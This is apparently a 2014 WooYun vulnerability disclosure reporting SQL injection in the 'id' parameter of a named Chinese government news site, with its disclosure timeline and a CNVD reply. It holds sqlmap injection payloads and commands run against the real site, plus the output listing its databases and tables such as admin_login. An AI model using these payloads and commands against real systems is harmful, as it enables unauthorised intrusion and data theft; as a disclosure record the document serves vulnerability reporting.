wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-06-05：	细节已通知厂商并且等待厂商处理中									2014-06-09：	厂商已经确认，细节仅向厂商公开									2014-06-19：	细节向核心白帽子及相关领域专家公开									2014-06-29：	细节向普通白帽子公开									2014-07-09：	细节向实习白帽子公开									2014-07-23：	细节向公众公开  简要描述： 桐城文明网#Mysql Injection 详细说明：  Mysql Injection地址：
http://www.tcwmw.gov.cn/news_info.php?id=1000

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 134 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1000 AND 4742=4742    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=1000 AND (SELECT 4887 FROM(SELECT COUNT(*),CONCAT(0x716b666371,(SELECT (CASE WHEN (4887=4887) THEN 1 ELSE 0 END)),0x7162786771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 23 columns    Payload: id=-9591 UNION ALL SELECT NULL,NULL,CONCAT(0x716b666371,0x694e69565a6578497751,0x7162786771),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=1000 AND SLEEP(5)---
   漏洞证明：  #1、获取数据库：
sqlmap -u http://www.tcwmw.gov.cn/news_info.php?id=1000 --dbs

available databases [2]:                                                       [*] information_schema[*] tcwmw
#2、获取表段：
sqlmap -u http://www.tcwmw.gov.cn/news_info.php?id=1000 -D tcwmw --tables

Database: tcwmw                                                                [14 tables]+-----------------+| count           || admin_authority || admin_login     || admininfo       || advanced        || big_class       || files           || info            || information1    || ip              || message         || sec_class       || third_class     || zyz             |+-----------------+
   修复方案：  :)   版权声明：转载请注明来源 从容@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-09 23:02 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给安徽分中心处置。 最新状态： 暂无
